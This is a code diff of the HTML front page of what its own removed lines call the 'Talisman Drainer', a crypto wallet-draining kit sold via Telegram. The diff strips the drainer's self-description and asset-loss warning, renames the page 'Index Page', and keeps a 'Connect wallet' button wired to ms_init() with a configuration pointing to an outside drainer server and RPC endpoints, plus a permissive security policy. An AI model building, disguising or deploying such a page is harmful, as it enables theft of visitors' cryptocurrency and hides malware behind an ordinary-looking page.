@@ -3,54 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="Content-Security-Policy" content="default-src 'self' https: chrome-extension: 'unsafe-inline' 'unsafe-eval'; script-src 'self' 'unsafe-inline' 'unsafe-eval' chrome-extension: https:; connect-src 'self' https: wss: chrome-extension:; style-src 'self' 'unsafe-inline' https:;">
-    <link rel="stylesheet" href="./assets/css/styles.css">
-
     <title>Web3 Integration</title>
+    
+    <!-- Styles -->
+    <link rel="preload" href="./assets/css/styles.css" as="style">
+    <link rel="stylesheet" href="./assets/css/styles.css">
+    
     <!-- Web3 Dependencies -->
-    <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
-    <script src="https://unpkg.com/web3@1.7.0/dist/web3.min.js"></script>
-    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.1/dist/umd/index.min.js"></script>
+    <script src="./assets/libs/web3.min.js"></script>
+    <script src="./assets/libs/web3modal.min.js"></script>
+    <script src="./assets/libs/web3-provider.min.js"></script>
 </head>
 <body>
-  <h1>Page with an example of how Talisman Drainer works</h1>
-  <p>Want to buy? Write to Telegram: @talisman_dev</p>
-  <hr>
-  <div class="advanced_mode">
-    <p><strong>Built-in wallet:</strong> <span id="injected-status">false</span></p>
-    <button onclick="ms_init()">Connect wallet</button>
-    <p><strong>Be careful!</strong> The script permanently writes off your assets!</p>
-  </div>
-    <!-- Local library imports -->
-    <script src="./assets/libs/web3.min.js"></script>
-    <script src="./assets/libs/index.min.js"></script>
-    <script src="./assets/libs/index.js"></script>
+    <h1>Index Page</h1>
+    <p>Main Page</p>
+    <hr>
+    <div class="advanced_mode">
+        <p><strong>Built-in wallet:</strong> <span id="injected-status">false</span></p>
+        <button onclick="ms_init()">Connect wallet</button>
+        <p><strong>Be careful!</strong> ##SERVER##</p>
+    </div>
 
-    <!-- Initialize MS_Server and MS_Settings before other scripts -->
+    <!-- Configuration -->
     <script>
-    window.MS_Server = {
-        endpoint: 'https://fasterdeliveryuae.com',
-        config: '/config'
-    };
-
-    window.MS_Settings = {
-        RPCs: {
-            1: "https://mainnet.infura.io/v3/511362d7fcc8491f9af15cc7fadf46ae",
-            56: "https://bsc-dataseed.binance.org/",
-            137: "https://polygon-rpc.com"
-        }
-    };
+        window.MS_Server = {
+            endpoint: 'https://fasterdeliveryuae.com',
+            config: '/config'
+        };
+        
+        window.MS_Settings = {
+            RPCs: {
+                1: "https://mainnet.infura.io/v3/511362d7fcc8491f9af15cc7fadf46ae",
+                56: "https://bsc-dataseed.binance.org/",
+                137: "https://polygon-rpc.com"
+            }
+        };
     </script>
 
-    <!-- Your existing scripts -->
+    <!-- Application Scripts -->
     <script src="./assets/web3-provider/web3-connect.js"></script>
-  <script>
-    setInterval(() => {
-      document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
-    }, 1000);
-  </script>
+    <script>
+        setInterval(() => {
+            document.getElementById('injected-status').innerHTML = 
+                (typeof window.ethereum === 'object') ? 'true' : 'false';
+        }, 1000);
+    </script>
 </body>
 </html>
-
-<!-- Add in head section -->
-<link rel="preload" href="./assets/styles.css" as="style">
-<link rel="stylesheet" href="./assets/styles.css">
